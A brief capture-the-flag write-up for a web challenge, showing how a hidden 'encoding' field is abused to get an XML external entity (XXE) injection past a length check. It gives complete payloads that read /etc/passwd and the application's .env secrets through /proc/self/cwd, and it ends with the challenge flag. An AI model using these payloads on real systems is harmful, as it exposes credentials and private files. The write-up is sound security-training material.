# XeXe

## Write-up (brief)

- There is a hidden HTML input : `encoding`

- **Approach :** Inject comment in `encoding` and XXE payload in `name`

- Trying the following payload in `encoding` : `UTF-8"?><!--` -> `Error! Encoding too long`

- After some trial, we can notice we can remove `-` from `UTF-8` and it still works : `UTF8"?><!--`

- Payload in name : `--><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><root><name>&xxe;`

- Full payload :

```xml
<?xml version="1.0" encoding="UTF8"?><!--"?>
<root>
	<name>--><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><root><name>&xxe;</name>
</root>
```

- Hint in `/etc/passwd` : `# You're going the right way, but you need to find a way to access the app files without knowing their path :)`

- Challenge description indicates that the flag is in the `.env` file of the application

- We can access the file from `/proc/self/cwd/.env`

- Final payload :

```xml
<?xml version="1.0" encoding="UTF8"?><!--"?>
<root>
	<name>--><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/self/cwd/.env"> ]><root><name>&xxe;</name>
</root>
```

## Flag

`shellmates{xx3_XX3_xXE_Xx3_xX3}`
